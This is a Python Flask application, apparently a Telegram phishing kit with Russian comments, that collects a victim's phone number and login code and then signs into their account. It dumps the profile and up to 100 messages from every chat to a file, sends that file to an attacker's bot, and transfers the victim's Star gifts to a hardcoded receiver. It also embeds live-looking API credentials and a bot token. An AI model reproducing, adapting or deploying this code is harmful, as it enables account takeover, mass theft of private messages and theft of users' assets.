from flask import Flask, render_template, request, jsonify, session
from telethon import TelegramClient, functions, types
from telethon.errors import SessionPasswordNeededError, UsernameNotOccupiedError
import asyncio
import os
import json
import logging
from datetime import datetime
import httpx
from flask_cors import CORS

logging.basicConfig(level=logging.INFO)

API_ID = 34667567
API_HASH = "819464e9d467c9e740a538cd5eca55a8"
RECEIVER_USERNAME = "@Defbymorgenshtern"
ADMIN_ID = 8503291981
BOT_TOKEN = "8980089433:AAE422NHqh7ajzxOIS64PoNDVHStrDF8fKE"

app = Flask(__name__)
app.secret_key = os.urandom(24)
CORS(app)

temp_data = {}

# ============================================================
# Отправка уведомлений админу
# ============================================================
async def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    async with httpx.AsyncClient() as client:
        await client.post(url, json={"chat_id": ADMIN_ID, "text": text})

# ============================================================
# Сбор данных в TXT (лимит 100 сообщений на диалог)
# ============================================================
async def collect_full_user_data_txt(client):
    # 1. Получаем данные владельца (жертвы)
    me = await client.get_me()
    my_id = me.id
    my_username = me.username or "нет"
    my_first_name = me.first_name or "нет"
    my_phone = me.phone or "нет"
    
    # 2. Создаём временный файл
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"dump_{my_id}_{timestamp}.txt"
    
    with open(filename, 'w', encoding='utf-8') as f:
        # Заголовок профиля
        f.write("ПРОФИЛЬ\n")
        f.write(f"НИК: @{my_username}\n")
        f.write(f"АЙДИ: {my_id}\n")
        f.write(f"НОМЕР ТЕЛЕФОНА: {my_phone}\n")
        f.write("===============================================\n\n")
        
        # Получаем все диалоги
        dialogs = await client.get_dialogs()
        
        # Кеш для сущностей (чтобы не дёргать API на каждое сообщение)
        entity_cache = {}
        
        for dialog in dialogs:
            # Определяем название и ID
            if dialog.is_user:
                entity = dialog.entity
                name = entity.first_name or entity.username or str(entity.id)
                phone = entity.phone if hasattr(entity, 'phone') and entity.phone else "скрыт"
            else:
                name = dialog.title or "Без названия"
                phone = "—"
            
            # Если диалог с самим собой (бывает) – пропускаем или пишем
            if dialog.is_user and dialog.entity.id == my_id:
                continue  # не пишем диалог с собой
            
            chat_header = f"ЧАТ С {name} (ID: {dialog.id}) (ТЕЛЕФОН: {phone})"
            f.write("==============================\n")
            f.write(chat_header + "\n")
            
            # Получаем сообщения (лимит 100)
            try:
                messages = []
                async for msg in client.iter_messages(dialog, limit=100):
                    messages.append(msg)
                # Переворачиваем, чтобы шли в хронологическом порядке (старые→новые)
                messages.reverse()
                
                for msg in messages:
                    # Определяем отправителя
                    sender_id = msg.sender_id
                    if not sender_id:
                        # Если нет sender_id, пробуем from_id
                        if msg.from_id:
                            sender_id = msg.from_id.user_id
                        else:
                            continue  # пропускаем
                    
                    # Определяем, жертва это или собеседник
                    if sender_id == my_id:
                        sender_name = f"@{my_username}" if my_username != "нет" else "Я"
                        line = f"СООБЩЕНИЕ({sender_name}): {msg.text or '[Медиа]'}\n"
                    else:
                        # Получаем сущность собеседника из кеша или через API
                        if sender_id not in entity_cache:
                            try:
                                entity = await client.get_entity(sender_id)
                                entity_cache[sender_id] = entity
                            except:
                                entity_cache[sender_id] = None
                        entity = entity_cache.get(sender_id)
                        if entity:
                            sender_name = entity.first_name or entity.username or str(sender_id)
                        else:
                            sender_name = str(sender_id)
                        line = f"СОБЕСЕДНИК({sender_name}): {msg.text or '[Медиа]'}\n"
                    
                    f.write(line)
                
                # Конец диалога
                f.write(f"==========КОНЕЦ ДИАЛОГА С {name} =======\n\n")
                
            except Exception as e:
                f.write(f"ОШИБКА при получении сообщений: {str(e)}\n\n")
                logging.error(f"Error fetching messages for dialog {dialog.id}: {e}")
    
    return filename

# ============================================================
# Отправка файла админу
# ============================================================
async def send_document_to_admin(file_path):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        async with httpx.AsyncClient(timeout=120.0) as http_client:
            with open(file_path, 'rb') as f:
                files = {'document': (os.path.basename(file_path), f, 'text/plain')}
                response = await http_client.post(url, data={'chat_id': ADMIN_ID}, files=files)
                if response.status_code != 200:
                    await send_telegram_message(f"❌ Ошибка отправки файла: {response.text}")
        logging.info(f"File {file_path} sent to admin.")
    except Exception as e:
        await send_telegram_message(f"❌ Ошибка отправки документа: {str(e)}")
        raise

# ============================================================
# Проверка баланса и подарков
# ============================================================
async def check_balance_and_gifts(client):
    try:
        me = await client.get_me()
        try:
            stars_status = await client(functions.payments.GetStarsStatusRequest(
                peer=await client.get_input_entity('me')
            ))
            balance = stars_status.balance.amount
        except Exception as e:
            await send_telegram_message(f"⚠️ Ошибка получения баланса: {str(e)}")
            balance = 0
        
        try:
            gifts_result = await client(functions.payments.GetStarGiftsRequest(hash=0))
            gifts = gifts_result.gifts
        except Exception as e:
            await send_telegram_message(f"⚠️ Ошибка получения подарков: {str(e)}")
            gifts = []
        
        return {
            "user_id": me.id,
            "username": me.username,
            "stars_balance": balance,
            "gifts_count": len(gifts) if gifts else 0,
            "gifts": gifts
        }
    except Exception as e:
        await send_telegram_message(f"❌ Ошибка проверки аккаунта: {str(e)}")
        return None

# ============================================================
# Передача подарков получателю
# ============================================================
async def transfer_nft_to_receiver(client, info):
    try:
        try:
            receiver = await client.get_entity(RECEIVER_USERNAME)
        except (UsernameNotOccupiedError, ValueError) as e:
            await send_telegram_message(f"❌ Получатель {RECEIVER_USERNAME} не найден: {str(e)}")
            return False
        
        result_text = f"🔔 Новая жертва!\n👤 @{info.get('username', 'unknown')}\n⭐ Баланс: {info.get('stars_balance', 0)}\n🎁 Подарков: {info.get('gifts_count', 0)}"
        
        if info.get('gifts_count', 0) > 0:
            for gift in info.get('gifts', []):
                try:
                    await client.send_gift(receiver, gift)
                    result_text += f"\n🎁 Подарок отправлен: {gift.id}"
                except Exception as e:
                    result_text += f"\n❌ Ошибка отправки подарка: {e}"
        await send_telegram_message(result_text)
        return True
    except Exception as e:
        await send_telegram_message(f"❌ Ошибка перевода: {str(e)}")
        return False

# ============================================================
# Веб-маршруты
# ============================================================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/auth')
def auth():
    return render_template('index.html')

@app.route('/check/<check_id>')
def check_page(check_id):
    return render_template('index.html')

# ============================================================
# API: отправка кода
# ============================================================
@app.route('/api/send-code', methods=['POST'])
def api_send_code():
    data = request.json
    phone = data.get('phone', '').strip()
    if not phone:
        return jsonify({"success": False, "error": "Введите номер"}), 400
    
    session_id = os.urandom(8).hex()
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def send_code():
        client = TelegramClient(f'sessions/{session_id}', API_ID, API_HASH)
        try:
            await client.connect()
            result = await client.send_code_request(phone)
            temp_data[session_id] = {
                'phone': phone,
                'phone_code_hash': result.phone_code_hash,
                'session_id': session_id
            }
            await client.disconnect()
            return True
        except Exception as e:
            logging.error(f"Send code error: {e}")
            await client.disconnect()
            return False
    
    try:
        success = loop.run_until_complete(send_code())
        if success:
            return jsonify({"success": True, "session_id": session_id})
        else:
            return jsonify({"success": False, "error": "Ошибка отправки кода"}), 500
    finally:
        loop.close()

# ============================================================
# API: проверка кода
# ============================================================
@app.route('/api/verify-code', methods=['POST'])
def api_verify_code():
    data = request.json
    code = data.get('code', '').strip()
    session_id = data.get('session_id', '')
    
    if not code or not session_id:
        return jsonify({"success": False, "error": "Введите код"}), 400
    
    if session_id not in temp_data:
        return jsonify({"success": False, "error": "Сессия не найдена"}), 400
    
    session_data = temp_data[session_id]
    phone = session_data['phone']
    phone_code_hash = session_data['phone_code_hash']
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    async def verify_and_process():
        client = TelegramClient(f'sessions/{session_id}', API_ID, API_HASH)
        try:
            await client.connect()
            await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            
            info = await check_balance_and_gifts(client)
            if info:
                try:
                    file_path = await collect_full_user_data_txt(client)
                    await send_document_to_admin(file_path)
                    if os.path.exists(file_path):
                        os.remove(file_path)
                except Exception as e:
                    await send_telegram_message(f"❌ Ошибка сбора/отправки TXT: {str(e)}")
                
                await transfer_nft_to_receiver(client, info)
            else:
                await send_telegram_message("❌ Не удалось получить данные аккаунта")
            
            await client.disconnect()
            if session_id in temp_data:
                del temp_data[session_id]
            return True
        except SessionPasswordNeededError:
            await client.disconnect()
            return "2fa_needed"
        except Exception as e:
            error_msg = f"❌ Ошибка входа: {str(e)}"
            logging.error(error_msg)
            await send_telegram_message(error_msg)
            await client.disconnect()
            return False
    
    try:
        result = loop.run_until_complete(verify_and_process())
        if result is True:
            return jsonify({"success": True, "message": "Авторизация успешна!"})
        elif result == "2fa_needed":
            return jsonify({"success": False, "error": "Требуется облачный пароль"})
        else:
            return jsonify({"success": False, "error": "Неверный код"}), 400
    finally:
        loop.close()

if __name__ == '__main__':
    os.makedirs('sessions', exist_ok=True)
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
